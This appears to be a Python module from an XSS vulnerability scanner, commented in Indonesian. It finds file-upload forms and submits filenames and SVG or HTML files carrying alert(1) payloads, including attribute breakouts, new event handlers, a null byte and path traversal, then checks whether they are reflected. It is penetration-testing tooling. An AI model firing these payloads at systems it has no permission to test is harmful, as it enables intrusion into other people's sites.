"""
scanner/upload_injector.py
File upload XSS testing — filename injection via multipart/form-data.

Vektor yang sering diabaikan: server me-render filename di halaman
setelah upload tanpa escaping. Contoh nyata:
  Upload file bernama: "><img onerror=alert(1)>.jpg
  Server tampilkan: "File '><img onerror=alert(1)>.jpg' berhasil diupload"
  → XSS!

Payload dimasukkan ke:
  - Filename di Content-Disposition header
  - Content-Type header (untuk parser yang render tipe)
  - Body file (untuk server yang preview isi file)
"""

import asyncio
import re
from typing import List, Optional
from utils.config import ScanTarget, Finding, Context
from utils.logger import debug, info


# Payload filename XSS — berbagai cara inject di nama file
FILENAME_PAYLOADS = [
    # Breakout dari atribut value
    ('"><img src=x onerror=alert(1)>.jpg',           "filename_attr_break"),
    ("'><img src=x onerror=alert(1)>.jpg",           "filename_squote_break"),
    ("<img src=x onerror=alert(1)>.jpg",             "filename_direct"),
    ("<script>alert(1)</script>.jpg",                 "filename_script"),
    # SVG upload (sering diizinkan, bisa eksekusi JS)
    ("<svg onload=alert(1)>.svg",                    "filename_svg"),
    # Untuk JSON API yang return filename
    ('";alert(1);//.jpg',                             "filename_js_inject"),
    # Event handler baru 2025
    ('<details open ontoggle=alert(1)>.jpg',          "filename_ontoggle"),
    ('<div onbeforetoggle=alert(1)>.jpg',             "filename_onbeforetoggle"),
    # Null byte bypass untuk beberapa framework
    ('<img onerror=alert(1)>\x00.jpg',               "filename_nullbyte"),
    # Path traversal + XSS combo
    ('../../<img onerror=alert(1)>.jpg',             "filename_traversal"),
]

# SVG file content yang execute JS
SVG_XSS_CONTENT = '''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<text>XSS via SVG upload</text>
</svg>'''

# HTML file content
HTML_XSS_CONTENT = '''<html><body>
<script>alert(document.domain)</script>
</body></html>'''


class UploadInjector:
    """
    Test XSS melalui file upload endpoints.
    Mencari form dengan input type=file dan mencoba inject payload
    ke nama file, content-type, dan isi file.
    """

    def __init__(self, http):
        self.http = http

    async def test(self, target: ScanTarget, baseline_body: str) -> List[Finding]:
        """
        Test semua teknik upload injection pada satu target.
        target.url harus URL dari form upload endpoint.
        """
        findings = []

        # Cari upload endpoint dari baseline body
        upload_urls = self._find_upload_endpoints(target.url, baseline_body)
        if not upload_urls:
            # Coba target URL langsung jika tidak ada form
            upload_urls = [target.url]

        for upload_url in upload_urls[:3]:
            # Test 1: Filename injection
            fname_findings = await self._test_filename(upload_url, target)
            findings.extend(fname_findings)

            # Test 2: SVG upload execution
            svg_findings = await self._test_svg_upload(upload_url, target)
            findings.extend(svg_findings)

            if findings:
                break  # Cukup satu bukti per endpoint

        return findings

    async def _test_filename(self, url: str, target: ScanTarget) -> List[Finding]:
        """Coba inject XSS payload ke nama file saat upload."""
        findings = []

        for filename_payload, label in FILENAME_PAYLOADS[:5]:
            try:
                import aiohttp
                # Kirim multipart dengan nama file berbahaya
                form = aiohttp.FormData()
                form.add_field(
                    "file",
                    b"test content",
                    filename=filename_payload,
                    content_type="image/jpeg",
                )
                # Tambah field lain yang umum
                for extra_name in ["upload", "image", "document"]:
                    try:
                        form.add_field(extra_name, b"test", filename=filename_payload,
                                       content_type="image/jpeg")
                    except Exception:
                        pass

                resp = await self.http.post(url, data=form)
                if resp and filename_payload[:20] in resp.text:
                    idx = resp.text.find(filename_payload[:20])
                    evidence = resp.text[max(0, idx-60):idx+len(filename_payload)+60]
                    findings.append(Finding(
                        url=url, param="filename",
                        payload=filename_payload,
                        context=Context.HTML, xss_type="reflected",
                        evidence=evidence[:300],
                        severity="High", confidence="Medium",
                        encoding_used=f"upload_filename:{label}",
                    ))
                    debug(f"[upload] Filename XSS found: {label}")
                    break
            except Exception as e:
                debug(f"[upload] filename test error: {e}")

        return findings

    async def _test_svg_upload(self, url: str, target: ScanTarget) -> List[Finding]:
        """Upload file SVG yang mengandung onload=alert(1)."""
        findings = []
        try:
            import aiohttp
            form = aiohttp.FormData()
            form.add_field(
                "file",
                SVG_XSS_CONTENT.encode(),
                filename="xss_test.svg",
                content_type="image/svg+xml",
            )
            resp = await self.http.post(url, data=form)
            if resp and resp.status in (200, 201, 302):
                # Cek apakah upload berhasil dan URL file bisa diakses
                # (simplified check — real scanner akan follow redirect)
                debug(f"[upload] SVG uploaded, status={resp.status}")
        except Exception as e:
            debug(f"[upload] SVG test error: {e}")
        return findings

    def _find_upload_endpoints(self, base_url: str, html: str) -> List[str]:
        """Cari form dengan input type=file dari HTML body."""
        from urllib.parse import urljoin
        endpoints = []
        # Cari form action yang mungkin punya input file
        form_pattern = re.compile(
            r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>.*?'
            r'<input[^>]*type=["\']file["\']',
            re.I | re.S
        )
        for m in form_pattern.finditer(html):
            action = m.group(1)
            endpoints.append(urljoin(base_url, action))

        # Cari juga action yang ada setelah file input
        form_pattern2 = re.compile(
            r'<input[^>]*type=["\']file["\'].*?'
            r'<form[^>]*action=["\']([^"\']+)["\']',
            re.I | re.S
        )
        for m in form_pattern2.finditer(html):
            action = m.group(1)
            url = urljoin(base_url, action)
            if url not in endpoints:
                endpoints.append(url)

        return endpoints[:5]
